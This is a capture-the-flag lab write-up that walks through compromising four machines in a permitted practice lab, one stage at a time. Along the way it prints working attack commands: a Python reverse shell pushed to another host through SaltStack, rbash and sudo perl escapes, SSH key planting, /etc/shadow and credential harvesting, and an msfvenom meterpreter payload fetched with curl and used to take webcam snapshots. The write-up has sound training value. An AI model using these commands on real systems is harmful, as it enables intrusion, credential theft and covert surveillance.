# CaptBoykin Lab

Contents:

1. TOC
{:toc}
<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

The CaptBoykin lab is something I lucked into thanks to VetSec Slack, where I met the designer and maintainer of the lab, CaptBoykin. It is intended as a basic-level challenge, featuring four separate machines, each with flags for the attacker to capture.  Two pieces of information are provided at the start:  An initial public IP address and a hint that the final flag involves taking a capture of a webcam aimed at the flag.  Everything between those two is up to you, and there are multiple paths to and through most of the machines.
<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

The following tools or techniques are active concepts used in the lab, above and beyond standard linux commands and enumeration commands such as ifconfig, ip a, netstat, su, etc and general web searches on Google or your search engine of choice.

-1- nmap

-2- gobuster

-3- Web enumeration

-4- ssh, ssh tunneling, ssh private & public keys

-5- rbash (restricted bash)

-6- perl (rbash escape and privilege escalation)

-7- nc listener and file transfer

-8- vncviewer

-9- guacamole

-10- sudo -l

-11- bash scripting (ping scan)

-12- python3 http.server and python3 reverse shell

-13- wget

-14- salt

-15- tcpdump

-16- msfvenom

-17- curl

-18- msfconsole and exploit/multi handler

-19- meterpreter and webcam commands
<p>&nbsp;</p>
=======================================================

## Target Machine 1

=======================================================

For my run through the lab, the initial IP address provided was 67.205.146.156.  My initial step was to confirm the target IP is up/responsive:

    ping -c 1 67.205.146.156

![](/images/boykin_lab/1. ping.png)

Attempt to browse to see if there is anything on port 80 and then port 443:

    http://67.205.146.156

![](/images/boykin_lab/1.apache2.png)

    https://67.205.146.156

![](/images/boykin_lab/2. https.png)

We have a default Apache web page on port 80 and an Apache Guacamole instance on port 443.  Let's try an nmap scan on some common ports and see what else we have:

    nmap -A -p21,22,25,80,443 67.205.146.156

![](/images/boykin_lab/3. nmap.png)

Here we have ssh open, and some version information for the ports 80 and 443. Let's start some directory busting on port 80 to see if there are interesting directories or files to explore:

    gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x php,txt,pdf,jpg,html -u http://67.205.146.156 -o gobuster.out

![](/images/boykin_lab/4. gobuster1.png)
![](/images/boykin_lab/4. gobuster2.png)

So we see flag.txt and notes.html which look interesting.  We can also check out the /site folder:

    http://67.205.146.156/flag.txt

![](/images/boykin_lab/5. flag1.png)

We have our first flag.

    http://67.205.146.156/notes.html

![](/images/boykin_lab/6. http.png)

And we have our first set of credentials:   hogan  :  0eXXXXXXXXXXXXXXXXXXXXXXXXXb7

    https://67.205.146.156/site

![](/images/boykin_lab/7. http_law.png)

Here we have a fairly templated website put on by the “CTF Crew”.  To see what is going on under the hood a bit, we can right-click in the browser and “View Page Source”:

![](/images/boykin_lab/8. use_the_source.png)

In a comment on the source code, we have a clue:  "Cleanup old dirs" is still on the TO DO list, which means there may be more for us to directory bust:

    gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x php,txt,pdf,jpg,html -u http://67.205.146.156/site -o gobuster_site.out
    
![](/images/boykin_lab/9. gobuster.png)
![](/images/boykin_lab/9. gobuster2.png)

The “_old” directory seems to align with the hint about cleaning up old dirs:
    
    https://67.205.146.156/site/_old

![](/images/boykin_lab/10. http.png)

Right-click, “View Page Source”:

![](/images/boykin_lab/11. view-source.png)

And further down in the source code:

![](/images/boykin_lab/11. view-source2.png)


So we have our second flag and a clue about “admin/index.html”

For now, we can continue directory busting with /\_old:

    gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x php,txt,pdf,jpg,html -u http://67.205.146.156/site/_old -o gobuster_site_old.out

![](/images/boykin_lab/12. gobuster.png)

![](/images/boykin_lab/12. gobuster2.png)

Here we have an _old/admin page:

    http://67.205.146.156/site/_old/admin

![](/images/boykin_lab/13. http.png)

Note: I had the FireFox add-on “NoScript” running, so it cut out a quick, possibly annoying part of the page. If you don't have NoScript or are using another browser...enjoy the show.  And we have our third flag.

Clicking through the above links, once we hit on Files, we see:

![](/images/boykin_lab/13. http2.png)

And then, clicking on etc/:

![](/images/boykin_lab/13. http3.png)

Here we have two files:

![](/images/boykin_lab/13. http4.png)
![](/images/boykin_lab/13. http5.png)

And we have two additional sets of credentials:

guacadmin  :  0eXXXXXXXXXXXXXXXXXXXXXXXXXb7

guacadmin  :  gXXXXXXXXXXXXXXXXX$

We can also run an nmap scan against all ports to see if there is anything else:

    nmap -T4- -p- 67.205.146.156

![](/images/boykin_lab/14. nmap_full.png)

    http://67.205.146.156:8080/:

![](/images/boykin_lab/15. http.png)

We have a default tomcat9 page.  So, once again we do some directory busting on this webapp:

    gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x php,txt,pdf,jpg,html -u http://67.205.146.156:8080 -o gobuster_8080.out

![](/images/boykin_lab/16. gobuster.png)

Trying out the /host-manager and /manager portals requests a username/password. None of the creds we have so far work here, and later on we can take a look at the tomcat-users.xml file on the machine and see there is no actual way to log in to either of these portals.

Our final nmap scan, going thorough on targeted ports:

    nmap -A -p22,25,80,443,8080,11211 67.205.146.156

![](/images/boykin_lab/17. nmap.png)

And nothing further worth pursuing at this time.  So, to re-cap our initial enumeration, we have three flags, with ssh (port 22) and guacamole (port 443) servers running that we can attempt to log into using one of the sets of credentials we found:

hogan  :  0eXXXXXXXXXXXXXXXXXXXXXXXXXb7

guacadmin  :  0eXXXXXXXXXXXXXXXXXXXXXXXXXb7

guacadmin  :  gXXXXXXXXXXXXXXXXX$

Let's start with ssh:

    ssh hogan@67.205.146.156

![](/images/boykin_lab/18. ssh.png)

And we have access! Let's see what we can do:

    pwd
    whoami && id && hostname

![](/images/boykin_lab/19. whoami.png)

So the whoami command ran, but it looks like id did not, and we have an rbash (restricted bash) error.  Continuing on:

    ls -la

![](/images/boykin_lab/20. ls.png)

We have a flag.txt but it is owned by root and the group escape which means user hogan cannot read it. Let's check the directory “bin”

    ls -la bin

![](/images/boykin_lab/20. ls_2.png)

Here it looks like rbash is restricting us to the commands listed in this directory.  Luckily we have perl, which we should be able to use to spawn a regular bash shell.  A quick article on this concept can be found here: [https://www.metahackers.pro/breakout-of-restricted-shell/](https://www.metahackers.pro/breakout-of-restricted-shell/)

    perl -e 'exec "/bin/bash";'

![](/images/boykin_lab/21. perl.png)

We receive an error, and a bash prompt again, so let's see if it worked by trying our whoami && id && hostname command again:

    whoami && id && hostname

![](/images/boykin_lab/22. whoami.png)

Again we are tripped up, but receive more information back. This is due to our current user's PATH variable being set to include /home/hogan/bin/, which we can sidestep by specifying the full path to the binary file we wish to use:

    whoami && /bin/id && /bin/hostname

![](/images/boykin_lab/22. whoami2.png)

And there we have execution of all three commands.  The whoami command works without specifying the full path because it is one of the links in user hogan's /home/hogan/bin/ directory we saw earlier, while id and hostname are not.

Moving on, let's see what else we can find:

    netstat -ptuna

![](/images/boykin_lab/23. netstat.png)

Port 5901 on localhost (127.0.0.1) is listening. We can use nc to try and see what is there:

    /bin/nc 127.0.0.1 5901

![](/images/boykin_lab/24. nc.png)

Now we can turn to Google for some quick help.  A quick search on port 5901 and RFB 003.008 shows these are related to VNC.  But since we only have ssh/command line access to the target, we need to find a way to connect to the VNC server running on the target from our remote attacking machine.  Fortunately, ssh can establish a tunnel for us to do just that as shown here: [https://www.systutorials.com/how-to-remote-control-linux-server-using-vnc-through-ssh-tunnel/](https://www.systutorials.com/how-to-remote-control-linux-server-using-vnc-through-ssh-tunnel/)

    ssh -L 1111:localhost:5901 hogan@67.205.146.156

We run the above command from our attacking (Kali) machine.  It does the following:

-L establishes a local listener on port 1111 that forwards all traffic sent to that port through the ssh tunnel to the machine at 67.205.146.156 where it is redirected to localhost (127.0.0.1) on port 5901.

For now, we can use a second terminal window to establish the connection:

    ssh -L 1111:localhost:5901 hogan@67.205.146.156

![](/images/boykin_lab/25. ssh_tunnel.png)

Now, on your Kali machine, in a new terminal window, run vncviewer and point it towards 127.0.0.1 1111:

    vncviewer localhost:1111

![](/images/boykin_lab/26. vncviewer.png)

In the above, I used the password 0eXXXXXXXXXXXXXXXXXXXXXXXXXb7 which we have for users hogan and guacadmin, but it did not work. Let's try again with our second password:  gXXXXXXXXXXXXXXXXX$

    vncviewer localhost:1111

![](/images/boykin_lab/26. vncviewer_2.png)

And we have a VNC session to a remote desktop!

![](/images/boykin_lab/26. vncviewer_3.png)

From the username in the upper right corner it looks like we are now user guacadmin. 

Note: The next few steps will cover an alternate path to obtain the above remote desktop connection without ever logging in via ssh to user hogan

We can try the credentials we used for vncviewer above to login over the https://67.205.146.156 guacamole portal:

    https://67.205.146.156
    guacadmin
    gXXXXXXXXXXXXXXXXX$

![](/images/boykin_lab/27. guacamole.png)

Click “Login”

![](/images/boykin_lab/27 guacamole_2.png)

Here we have the same desktop as user guacadmin, only we are accessing it through guacamole in our web browser vice through ssh tunnels and vncviewer.  This path to user guacadmin avoids user hogan and the rbash escape.

Note: End alternate path

Continuing on, let's open a terminal window and see what we have:

    whoami && id

![](/images/boykin_lab/28. whoami.png)

So we are user guacadmin and also a member of the “escape” group.  We should be able to go read /home/hogan/flag.txt now, but let's also check /home/guacadmin/ for a flag:

![](/images/boykin_lab/29. ls.png)

Let's grab the two flags:

    cat /home/guacadmin/flag.tx
    cat /home/hogan/flag.txt

![](/images/boykin_lab/30. flags.png)

And here we have our first two flags inside this machine.  Let's continue to explore how this system is configured:

    ifconfig -a

![](/images/boykin_lab/31. ifconfig.png)

Here we see there is an internal network: 10.136.x.x. Let's keep that in mind.

    sudo -l

![](/images/boykin_lab/32. sudo.png)

And it looks like we can use /usr/bin/perl as root, without a password!  We can slightly modify our previous perl command used to escape the rbash shell:

    sudo /usr/bin/perl -e 'exec "/bin/bash";'

![](/images/boykin_lab/32. sudo_2.png)

And we are root. One thing we have not done yet is take a look at the /home folder to see what other user accounts are on this machine.

![](/images/boykin_lab/33. ls.png)

So we have another user, capt.  Let's grab /home/capt/flag.txt and /root/flag.txt:

    cat /home/capt/flag.txt
    cat /root/flag.txt

![](/images/boykin_lab/34. flags.png)

We have two more flags.

Now, since we are root, and we know there is an internal network, we will likely be doing quite a bit more with this machine. I find the VNC connection clunky so let's see if we can find another way to directly access this machine. Looking in the /root directory, we see:

    ls -la /root

![](/images/boykin_lab/35. ls.png)

The .ssh folder may hold a private key for us to use to authenticate to this machine:

    cd /root/.ssh
    ls -la

![](/images/boykin_lab/36. cd.png)

Alright so no id_rsa or id_rsa.pub files here, but we do have authorized_keys.  If we can echo our own id_rsa.pub key into this file, then we will be able to ssh onto this machine as root.

To transfer our Kali id_rsa.pub file over to Target machine 1, we will use nc.

On Target machine 1:

    nc -lvnp 17011 > test

On our Kali machine, first we need to go to the directory where our id_rsa.pub file is located, then run a nc command.  Pay special attention to the “<” in the below nc command.  If you use “>” instead, you will end up overwriting your id_rsa.pub file which means we would need to generate new ssh keys using ssh-keygen.  A best practice here would be to make a copy of the id_rsa.pub file before proceeding:

    cd /root/.ssh
    nc 67.205.146.156 17011 < id_rsa.pub

![](/images/boykin_lab/37. nc.png)
![](/images/boykin_lab/37. nc_2.png)

Once you see the connection received message on the target, you can hit Ctrl+c to kill nc.  This should also end the nc process on your Kali machine.  Next, we cat our test file to ensure the public key was received:

    cat test

![](/images/boykin_lab/38. cat.png)

And now we can append this key into the authorized_keys file:

    cat test >> authorized_keys
    cat authorized_keys

![](/images/boykin_lab/38. cat_2.png)

Now, from our Kali machine we should be able to ssh directly to this Target as root:

    ssh -i id_rsa root@67.205.146.156

![](/images/boykin_lab/39. ssh.png)

And now we have root access via ssh.  We can close the vncviewer and the previous ssh sessions we had set up.

    ip route

![](/images/boykin_lab/40. ip_route.png)

We already know Target machine 1, ubuntu-s-1vcpu-2gb-nyc1-03, has two network interfaces.  There is the public facing IP and an internal network:  10.136.0.0/16.  Our IP on this internal network is 10.136.0.2.

We do not have nmap or other tools on this machine, and even though we could install them, we can proceed a little more quietly by doing a simple ping scan using a bash one-liner:

    for i in $(seq 1 254); do (ping -c 1 10.136.0.${i} | grep "bytes from" &); done;

![](/images/boykin_lab/41. bash_ping.png)

So we have three other machines:
  10.136.0.3
  10.136.0.4
  10.136.0.5

Also, we can grab the /etc/shadow file:

    cat /etc/shadow

![](/images/boykin_lab/42. shadow.png)
trimmed
![](/images/boykin_lab/42. shadow_2.png)
trimmed
![](/images/boykin_lab/42. shadow_3.png)

So, just in case we want to take a shot at cracking these later, we have three usernames and password hashes.  Continuing with enumeration:

    netstat -ptuna

![](/images/boykin_lab/43. netstat.png)

Here we see our current machine (10.136.0.2) has a python script (PID 81040) which is connecting to another machine on the internal network (10.136.0.4) at port 4505.  Let's see if we can get what python command or script is running:

    ps -aux | grep 81040

![](/images/boykin_lab/44. ps.png)

So user capt is running salt-minion.  A quick Google for “salt port 4505” returns the SaltStack documentation:
![](/images/boykin_lab/45. google.png)

[https://docs.saltstack.com/en/getstarted/system/communication.html](https://docs.saltstack.com/en/getstarted/system/communication.html)

![](/images/boykin_lab/46. saltstack.png)

To summarize, our current machine is Target machine 1, 10.136.0.2, which appears to be operating as a Salt Minion making 10.136.0.4 (Target machine 2) the Salt Master. If we can access Target machine 2, we may be able to issue commands to other salt-minions.

For now, let's check out the /home/capt folder:

    cd /home/capt
    ls -la

![](/images/boykin_lab/47. cd.png)

The note-to-self.txt in /home/capt tells us the id_rsa file was “accidentally” password protected.

    cat note-to-self.txt

![](/images/boykin_lab/48. cat.png)

So, we download /home/capt/.ssh/id_rsa and id_rsa.pub files locally to our Kali machine:

    cd /home/capt/.ssh
    python3 -m http.server 17011

On our Kali machine:

wget http://67.205.146.156:17011/id_rsa
wget http://67.205.146.156:17011/id_rsa.pub

When the above steps are complete, our terminal windows show:

![](/images/boykin_lab/49. python_http.png)
![](/images/boykin_lab/50. wget.png)

Next, we look for a way to crack the password. Some Google searching on Github revealed the following script: [https://github.com/readonlymaio/mm_id_rsa_bruteforce](https://github.com/readonlymaio/mm_id_rsa_bruteforce)

This bash script uses ssh-keygen to bruteforce a list of passwords against the id_rsa file.  Note: In the below, after downloading the script from the above github link, I renamed the script “ssh_crack.sh”.

    ./ssh_crack.sh /usr/share/wordlists/rockyou.txt id_rsa

![](/images/boykin_lab/51. ssh_crack.png)

Now we have the password aXXXXXX3 for the id_rsa, we can try using it to ssh to 10.136.0.4 (Target machine 2) from our current machine (Target machine 1):

    ssh -i id_rsa capt@10.136.0.4

![](/images/boykin_lab/52. ssh.png)

<p>&nbsp;</p>
=======================================================

## Target Machine 2

=======================================================

And we have made it to Target machine 2.  Right away from the login screen we can see the public IP of this machine is 157.245.141.85.  We can close this ssh session and connect directly from our Kali machine:

    ssh -i id_rsa capt@157.245.141.85

![](/images/boykin_lab/53. ssh_fail.png)

And here I forgot to chmod the id_rsa file to a more secure permissions setting prior to trying to use it.  ssh detects the file is not secured and will not allow its use.

    chmod 600 id_rsa
    ssh -i id_rsa capt@157.245.141.85

![](/images/boykin_lab/54. chmod.png)

And now we are on Target machine 2 directly from our attacking machine. Let's start with some basic enumeration of the system:

    whoami && id && hostname
    ls -la /home
    ls -la /home/capt

![](/images/boykin_lab/55. whoami.png)

Here we have a flag, so let's grab it:

    cat /home/capt/flag.txt

![](/images/boykin_lab/56. flag.png)


Continuing on with some enumeration, we can see the /home/capt/.ssh/id_rsa and id_rsa.pub files on Target machine 2 are different than the ones on Target machine 1, so we download them to our Kali machine:

![](/images/boykin_lab/57. python_http.png)
![](/images/boykin_lab/58. wget.png)
![](/images/boykin_lab/59. wget_2.png)

This time with the wget command we used the -O machine_2_id_rsa to tell wget to download the file and write it with a different filename.  This is to avoid overwriting the first id_rsa and id_rsa.pub files we downloaded from Target machine 1.  Continuing with enumeration:

    netstat -ptuna

![](/images/boykin_lab/60. netstat.png)

Here we see the Salt minion and master ports (4505 and 4506) as expected. We also see a listener on port 3333.  The basic executable to manage salt is “salt”.  We can see the various options by running the following:

    salt -h

![](/images/boykin_lab/61. salt.png)
trimmed

We should be able to find each host acting as a minion with a command like the following:

    salt -t 10 "*" cmd.run "uname -a"

![](/images/boykin_lab/61. salt_2.png)

However, our current user does not have permission.  Looks like we need to privesc to root in order to actually run salt.
Since we know there is some sort of traffic coming to this machine on port 3333, we can run a packet capture on it.

    tcpdump -h

![](/images/boykin_lab/62. tcpdump.png)

tcpdump is a command line packet capture tool that is essential in your toolkit.  Many times on labs or ctfs, we only have command line access to a machine which means even though we can launch graphical user interface based packet capture utilities like wireshark, we do not have remote desktop access to use them through the graphical interface.  In these cases, knowing some basics of tcpdump can save the day.  A quick tutorial on tcpdump can be found here:  [https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/](https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/)

We should be able to capture just the traffic we want using a command like:

    tcpdump -A -vv -i eth1 port 3333 > tcpdump.out

![](/images/boykin_lab/62. tcpdump_2.png)

-A means to capture packets in ASCII/human readable format

-vv is for extra verbosity

-i eth1 is capturing only on interface eth1, which is the internal network based on our earlier ifconfig command

port 3333 captures only port 3333 traffic

Let the above command run for a minute or so then Ctrl+c it to stop the capture.

![](/images/boykin_lab/62. tcpdump_3.png)

Now we can examine the tcpdump.out:

    cat tcpdump.out

![](/images/boykin_lab/63. cat.png)
trimmed
![](/images/boykin_lab/63. cat_2.png)

And here we see another set of credentials:    root  :  -XXXXXXXXXXXXXXXXV           

Now we can try to switch user to root using this password:

    su root
    -XXXXXXXXXXXXXXXXV 

![](/images/boykin_lab/64. su.png)

And we are root on Target machine 2.  Let's grab the root flag and look at root's folder:

    cd /root
    cat /root/flag.txt
    ls -la

![](/images/boykin_lab/65. flag.png)

We have our root flag for this machine.  The flag also gives us a hint that salt is indeed the way forward.  Let's try to run the salt command again to see which minions are connected:

    salt -t 10 "*" cmd.run "uname -a"

![](/images/boykin_lab/66. salt.png)

    salt -t 10 "*" cmd.run "ifconfig eth1"

![](/images/boykin_lab/66. salt_2.png)

So now we know host ubuntu-s-1vcpu-2gb-nyc1-01 is at internal IP 10.136.0.3.  From here we can use the salt master/minion relationship to spawn a reverse shell. After some trial and error, I found python3 to be reliable, but we have to escape the double quotes inside the command itself:

    salt -t 10 "ubuntu-s-1vcpu-2gb-nyc1-01" cmd.run "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.136.0.2\",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

Before running that command, we need to set up a nc listener on Target machine 1, which means we need to ssh back into it from our Kali machine if we do not already have a connection:

    ssh -i id_rsa root@67.205.146.156
    nc -lvnp 17011

![](/images/boykin_lab/67. nc.png)

Now, back on Target machine 2, we can run the salt command to trigger a reverse shell:

    salt -t 10 "ubuntu-s-1vcpu-2gb-nyc1-01" cmd.run "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.136.0.2\",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

![](/images/boykin_lab/68. salt_rev_shell.png)

The command may appear to hang in this terminal window, but over in our nc listener:

![](/images/boykin_lab/69. root.png)

<p>&nbsp;</p>
=======================================================

## Target Machine 3

=======================================================

We have root on Target machine 3!  Let's grab some flags.

    ls /home
    cat /home/capt/flag.txt
    cat /root/flag.txt

![](/images/boykin_lab/70. flag.png)

And we have our flags for capt and root. Time for more enum.  Since we did not ssh onto this machine, we need to find the public IP address if it has one:

    ifconfig
    ls -la /root/.ssh

![](/images/boykin_lab2/71. ifconfig.png)

Public IP address:  165.227.86.197
Once again we have access to place our id_rsa.pub file in /root/.ssh/authorized keys.

In the /root/.ssh folder, we setup a nc listener that will directly append any data it receives into authorized_keys.  This is a simplification of the steps we used earlier, cutting out the need to first re-direct the file into a new file before appending its contents to authorized_keys:

    cd /root/.ssh
    nc -lvnp 17011 >> authorized_keys

![](/images/boykin_lab2/72. authorized_keys.png)

On Kali, from the /root/.ssh folder, run the nc connection again:

    nc 165.227.86.197 < id_rsa.pub

![](/images/boykin_lab2/73. nc_file_transfer.png)

Once you run the command on Kali and see the “Connection received” message on Target machine 3, you can Ctrl+c the nc running on Kali to close the connection.  In the above screenshot we also ran the “ls -la” command afterwards to show the file size changed on authorized_keys which lets us know the data was appended.  

Now we can ssh directly to Target machine 3 from our Kali machine:

    ssh -i id_rsa root@165.227.86.197

![](/images/boykin_lab2/74. ssh.png)

Once we have access directly from our Kali machine, we can kill the other sessions by Ctrl+c and/or typing exit in the remaining terminal windows.

Now we can continue on with enumeration:

    netstat -ptuna

![](/images/boykin_lab2/75. netstat.png)

And here we see there are several ports listening on localhost (127.0.0.1) and running from ssh, which means they are likely ssh tunnel/port forwards to another machine.  At the end of this list we see a “Foreign Address” that is not one of the ones we previously saw in this lab, also connected via ssh: 70.242.177.5.  It is likely these port forwards are going to this machine, or at the very least have been initiated by this machine.

These ports are some common Windows ports, however working through them using nc does not yield anything of interest until:

    nc 127.0.0.1 5900

![](/images/boykin_lab2/76. nc_5900.png)

And we have what appears to be a user shell on Target machine 4, a Windows 10 machine.  

<p>&nbsp;</p>
=======================================================

## Target Machine 4

=======================================================

So far we have been working through Linux machines.  Target machine 4 represents a shift to Windows, specifically Windows 10. Once again, time for enumeration, however some of the commands below will be different compared to their Linux counterparts:

First, let's gather some general information about the user we are logged in as and the system itself:

    whoami && hostname

![](/images/boykin_lab2/77. whoami.png)

    systeminfo

![](/images/boykin_lab2/78. systeminfo.png)
![](/images/boykin_lab2/78. systeminfo_2.png)

Next, let's take a look at some network related information to see our interfaces, IP addresses, and ports that are open or have connections:

    ipconfig /all

![](/images/boykin_lab2/79. ipconfig.png)
trimmed
![](/images/boykin_lab2/79. ipconfig_2.png)

    curl ipinfo.io

![](/images/boykin_lab2/80. curl.png)

    netstat -ano

![](/images/boykin_lab2/81. netstat.png)

Finally, a bit more of a dive into our user's privileges, and simple command to see what other users may have accounts on this system before we begin digging through the directory structure for files of interest:

    whoami /all

![](/images/boykin_lab2/82. whoami.png)

    net user

![](/images/boykin_lab2/83. net_user.png)

    dir

![](/images/boykin_lab2/84. dir.png)

    type bindrun.bat

![](/images/boykin_lab2/85. type.png)

    type Bindshell5900-2.ini

![](/images/boykin_lab2/85. type_2.png)

The above bindrun.bat and Bindshell5900-2.ini files are what establish and maintain the connection which allowed us to access this machine.  Here we have a hint to the directory “C:\tmp\tools” so let's see what is there:

    dir C:\tmp\tools

![](/images/boykin_lab2/86. dir.png)

So after running the various commands above and searching through several directories (much of which was not shown) and even the tasklist, we see a directory of various tools, but we still really only have command line access through the nc connection.  We also confirmed the public IP address of Target machine 4 is 70.242.177.5.

The one hint provided to us was the final step involves taking a snapshot from an attached webcam.  An ‘easy’ way to take a still from an attached webcam is through a meterpreter shell, which means we need to upload an executable that will create a meterpreter reverse shell back to us.  To do that we will use msfvenom:

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=52.12.133.246 LPORT=17011 -f exe > win_the_war.exe

-p for a payload, specifically a Windows meterpreter which will create a reverse tcp connection

LHOST is the IP address meterpreter will connect to, in this case the public IP of my AWS VPN.

LPORT is the port meterpreter will connect to

-f for fomat, in this case windows executable or exe

and finally we redirect the output into a file named “win_the_war.exe”

![](/images/boykin_lab2/87. msfvenom.png)

For my setup, I connect from my home network to a VPN server I have set up on AWS.  From there I connect to the target, which means the public IP address the meterpreter needs to call back to is the AWS VPN public IP, not my home IP address.  So, I needed to set up ssh tunnels to direct the connection to my Kali machine.

The first step was to open up a port on the AWS management console's security group, in this case 17011, and only for traffic from 70.242.177.5.

![](/images/boykin_lab2/88. aws.png)

Next, to establish the tunnel from the AWS VPN server to my Kali VM.  The Kali side of the VPN connection is 192.168.17.2, while the AWS VPN server side is 192.168.17.1.  From a terminal window on the AWS VPN server:

    sudo ssh -fN -L 0.0.0.0:17011:0.0.0.0:17011 root@192.168.17.2

![](/images/boykin_lab2/89. ssh_tunnel.png)

This establishes a listener on the AWS server on port 17011 which forwards any traffic received there through the ssh connection over the VPN interface to my local Kali machine (192.168.17.2) to port 17011 which is where I will have my msfconsole listening.

Next I ran a python http server on my Kali machine from the directory where the meterpreter reverse shell.exe was located:

    python3 -m http.server 17011

![](/images/boykin_lab2/90. python_http.png)

On Target machine 4, I used curl to download the exe, in this case win_the_war.exe

    curl -o win_the_war.exe http://52.12.133.246:17011/win_the_war.exe

![](/images/boykin_lab2/91. curl.png)

Once downloaded successfully, we can kill (Ctrl + c) the python http server.

![](/images/boykin_lab2/92. python_http.png)

Next we fire up msfconsole and set up our multi handler to listen on port 17011 to catch the reverse shell connection.

    msfconsole
    use exploit/multi/handler

![](/images/boykin_lab2/93. msfconsole.png)
![](/images/boykin_lab2/93. msfconsole_2.png)

I have modified my msf prompt from the default to show information I wish to see. Do not worry if yours looks slightly different.

    show options

![](/images/boykin_lab2/94. options.png)

Here we need to set LHOST, LPORT, and also the payload which is defaulting to “generic/shell_reverse_tcp” but needs to be set to a meterpreter one:

    set LHOST 0.0.0.0
    set LPORT 17011
    set payload windows/meterpreter/reverse_tcp

![](/images/boykin_lab2/95. set.png)

Now to confirm the options are set, we show options one more time:

    show options

![](/images/boykin_lab2/96. options.png)

Now we run the handler to start it:

    run

![](/images/boykin_lab2/97. run.png)

Once multi handler is ready, on the Windows target we execute win_the_war.exe, using “start /B".  Using start /B runs our executable in the background so if the program crashes or hangs, it should not disrupt our nc connection:

    start /B win_the_war.exe

![](/images/boykin_lab2/98. start.png)

In your msfconsole window you should see a connection and a meterpreter session opened!

![](/images/boykin_lab2/99. meterpreter.png)

Next for the webcam shot. In our meterpreter session we run the following commands to first list the webcams available and then take a screen grab from each one:

    webcam_list

![](/images/boykin_lab2/100. webcam.png)

    webcam_snap -i 1
    webcam_snap -i 2

![](/images/boykin_lab2/101. webcam_snap.png)

webcam_snap -i 2 should be successful, and you have the final flag:

![](/images/boykin_lab2/102. final_flag.png)

As of mid-September 2020, this concludes the lab.  But wait, what happened to 10.136.0.5?  We saw it on our initial ping scan from 10.136.0.2, but never exploited it.  As of this writing, 10.136.0.5 was a salt-minion which could be exploited using the same technique (python3 reverse shell).  However, it was not configured with additional challenges or flags for the lab so I did not show any of the steps or settings on it here in case CaptBoykin decides to use that machine to add to the lab in the future.

<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

-1- bash script for ping scan:  for i in $(seq 1 254); do (ping -c 1 10.136.0.${i} \| grep "bytes from" &); done;

-2- python3 reverse shell:  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.136.0.2\",17011));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'

<p>&nbsp;</p>
=======================================================

## Links and Additional Reading

=======================================================

1. rbash breakout: [https://www.metahackers.pro/breakout-of-restricted-shell/](https://www.metahackers.pro/breakout-of-restricted-shell/)
2. VNC through SSH: [https://www.systutorials.com/how-to-remote-control-linux-server-using-vnc-through-ssh-tunnel/](https://www.systutorials.com/how-to-remote-control-linux-server-using-vnc-through-ssh-tunnel/)
3. SaltStack: [https://docs.saltstack.com/en/getstarted/system/communication.html](https://docs.saltstack.com/en/getstarted/system/communication.html)
4. id_rsa brute force: [https://github.com/readonlymaio/mm_id_rsa_bruteforce](https://github.com/readonlymaio/mm_id_rsa_bruteforce)
5. tcpdump tutorial: [https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/](https://www.linuxtechi.com/capture-analyze-packets-tcpdump-command-linux/)

<p>&nbsp;</p>
=======================================================

## Parting Thoughts

=======================================================

A huge thank you to CaptBoykin for building this lab and letting me take a run through (or several runs through) on it, and for giving permission to post the write up.  Working through the lab introduced me to a few new things (Guacamole and SaltStack) and gave me the opportunity to reinforce some basic concepts and techniques, such as getting a few reps in on ssh tunneling.  

<p>&nbsp;</p>

=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
